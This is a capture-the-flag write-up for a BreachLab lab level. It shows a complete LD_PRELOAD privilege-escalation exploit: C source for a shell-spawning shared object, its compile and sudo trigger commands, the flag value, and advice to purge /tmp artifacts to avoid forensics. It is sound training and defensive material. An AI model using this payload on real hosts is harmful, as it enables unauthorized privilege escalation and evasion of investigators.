# BreachLab - Phantom Track: Level 3 (Inheritance)

## General Information

- **Platform:** [BreachLab](https://breachlab.org)
- **Track:** Phantom Track (Post-Exploitation & Operational Tradecraft)
- **Level:** Level 3 (Inheritance)
- **Host:** `204.168.229.209`
- **Port:** `2223`
- **Current User:** `phantom3`
- **Compromised User:** `flagkeeper3`
- **Goal:** Exploit sudo environment inheritance (`env_keep+=LD_PRELOAD`) to execute arbitrary code as `flagkeeper3` and extract the level flag
- **Next User / Flag Code:** `bl_phtm3_a76028a5c2716fec`

---

## 1. Scenario & Objectives

Upon logging in via SSH, the MOTD banner and `BRIEFING` detail the mission parameters:

```
MISSION: Inheritance
====================

You can run one harmless command as another user. Sudo is strict
about which command you may run — but not about everything it
inherits from your shell when it starts.

Figure out what sudo is letting through, and carry something
dangerous in with it. A C compiler is present on this box.

FLAG: owned by the user sudo lets you impersonate — not root.
```

The objective is to audit delegated sudo permissions, identify the security risk introduced by environment variable preservation (`env_keep+=LD_PRELOAD`), compile a custom dynamic shared library (`.so`) in C to intercept binary startup, execute `/usr/bin/id` under target user `flagkeeper3`, spawn a privileged subshell, and retrieve `/var/lib/phantom-flags/level3_flag`.

---

## 2. Reconnaissance & Sudo Privilege Enumeration

Logging in via SSH as `phantom3` and auditing delegated sudo permissions:

```bash
phantom3@phantom:~$ sudo -l
Matching Defaults entries for phantom3 on phantom:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty, env_keep+=LD_PRELOAD

User phantom3 may run the following commands on phantom:
    (flagkeeper3) NOPASSWD: /usr/bin/id
```

### Forensic Diagnosis of the Sudo Configuration

1. **Allowed Binary:** `(flagkeeper3) NOPASSWD: /usr/bin/id`
   - The rule permits executing only `/usr/bin/id` under the security context of `flagkeeper3` without password authentication.
   - Unlike interactive utilities (`vim`, `less`, `find`), `id` is a passive binary that does not provide direct interactive shell escape options (GTFOBins).
2. **Critical Security Flaw:** `env_keep+=LD_PRELOAD`
   - Sudo defaults to `env_reset` to purge environment variables across privilege boundaries.
   - However, the explicit directive `env_keep+=LD_PRELOAD` instructs `sudo` to retain and pass the user-controlled `LD_PRELOAD` variable into the execution environment of `flagkeeper3`.

---

## 3. Vulnerability Mechanism: Dynamic Linker & Environment Inheritance

In Linux dynamic linking architectures, the dynamic linker (`ld.so` / `ld-linux.so`) resolves shared library dependencies before transferring execution control to a program's `main()` entrypoint.

- When `LD_PRELOAD` is populated with the path to a shared library (`.so`), the dynamic linker loads and links that library **first**, prior to any standard runtime libraries (such as `libc.so`).
- Because `sudo` preserves `LD_PRELOAD` across the execution transition to `flagkeeper3`, any malicious shared object specified in `LD_PRELOAD` will run with the effective UID and privileges of `flagkeeper3`.

---

## 4. Exploitation: Shared Object Injection (`pe.c` / `pe.so`)

### 4.1. Crafting the Malicious Payload

To hijack the process initialization, we create a C payload in `/tmp/pe.c`:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    // 1. Romper el bucle de ejecución limpiando la variable
    unsetenv("LD_PRELOAD");
    // 2. Invocar una shell manteniendo los privilegios heredados por sudo
    execl("/bin/bash", "bash", "-p", NULL);
}
```

### Critical Component Analysis

- **The `_init()` Constructor:** In ELF shared object binaries, `_init()` is executed immediately when the library is loaded into the process address space by `ld.so`. Hooking this function guarantees arbitrary code execution before `/usr/bin/id` starts.
- **`unsetenv("LD_PRELOAD")` (Preventing Fork-Bomb recursion):** When launching a child `/bin/bash` shell, bash will also invoke the dynamic linker. If `LD_PRELOAD` remains set in the environment, the child bash process will reload `pe.so`, call `_init()`, and spawn another bash process in an infinite recursive loop (fork bomb) that would freeze the machine. Calling `unsetenv("LD_PRELOAD")` eliminates this risk.
- **`execl("/bin/bash", "bash", "-p", NULL)`:** Spawns an interactive bash shell with the `-p` (privileged mode) flag, ensuring that bash does not automatically drop effective UID privileges.

### 4.2. Compiling the Shared Object

We compile the source file into a position-independent shared object:

```bash
phantom3@phantom:/tmp$ gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

- **`-fPIC`** (*Position Independent Code*): Generates position-independent machine instructions, mandatory for shared libraries loaded at dynamic memory addresses.
- **`-shared`**: Produces a shared object library (`.so`) rather than a standard ELF executable.
- **`-nostartfiles`**: Omits standard C runtime initialization files (`crt1.o`, `crti.o`, etc.), allowing our custom `_init()` function to serve as the direct initialization routine.

### 4.3. Triggering the Exploit via Sudo

We invoke the permitted command `/usr/bin/id` with `LD_PRELOAD` pointing to our compiled library:

```bash
phantom3@phantom:/tmp$ sudo -u flagkeeper3 LD_PRELOAD=/tmp/pe.so /usr/bin/id
flagkeeper3@phantom:/tmp$ whoami
flagkeeper3
```

The dynamic linker loaded `/tmp/pe.so` under the effective identity of `flagkeeper3`, executed `_init()`, and handed over an interactive shell.

---

## 5. Privilege Consolidation & Flag Extraction

With an interactive shell operating as `flagkeeper3`, we read the level flag:

```bash
flagkeeper3@phantom:/tmp$ whoami
flagkeeper3

flagkeeper3@phantom:/tmp$ cat /var/lib/phantom-flags/level3_flag
bl_phtm3_a76028a5c2716fec
```

---

## 6. Flag / Credentials Retrieved

| Parameter | Value |
| :--- | :--- |
| **Track** | Phantom Track (Level 3) |
| **Current User** | `phantom3` |
| **Compromised User** | `flagkeeper3` |
| **Sudo Privilege** | `(flagkeeper3) NOPASSWD: /usr/bin/id` |
| **Vulnerability Vector** | Sudo Environment Inheritance (`env_keep+=LD_PRELOAD`) |
| **Exploitation Technique** | Dynamic Linker Shared Object Hijacking (`_init()` Hook) |
| **Discovered Flag** | `bl_phtm3_a76028a5c2716fec` |
| **Artifact Path** | `/var/lib/phantom-flags/level3_flag` |

---

## 7. Key Commands & Concepts Reference

- `sudo -l`: Inspect current sudo privileges and inherited environment policies (`env_keep`).
- `gcc -fPIC -shared -o pe.so pe.c -nostartfiles`: Compile position-independent shared object without default C runtime startup wrappers.
- `sudo -u <user> LD_PRELOAD=/path/to/lib.so <command>`: Inject custom shared library into elevated process execution context.
- `unsetenv("LD_PRELOAD")`: Sanitize environment before spawning child subshells to avoid infinite recursion / fork bombs.
- `/bin/bash -p`: Launch privileged shell preserving inherited effective user privileges.

---

## 8. Lessons Learned & Defensive Takeaways

1. **Severe Danger of `env_keep` on Linker Variables:** Preserving environment variables that control dynamic library resolution (`LD_PRELOAD`, `LD_LIBRARY_PATH`, `PYTHONPATH`) across `sudo` boundaries completely negates binary-level restrictions and allows trivial arbitrary code execution as the target user.
2. **Shared Library Constructor Exploitation:** In binary analysis and malware research (*Shared Object Hijacking*), overriding constructor routines (`_init()` or `__attribute__((constructor))`) allows injecting arbitrary execution logic into benign binaries without modifying the target binary on disk.
3. **Operational Anti-Forensics & Cleanup:** In real-world offensive tradecraft and Purple Team engagements, artifacts created in world-writable shared directories like `/tmp/` (such as `/tmp/pe.c` and `/tmp/pe.so`) must be securely purged (`rm pe.c pe.so`) immediately after exploitation to minimize forensic Indicators of Compromise (IoCs).
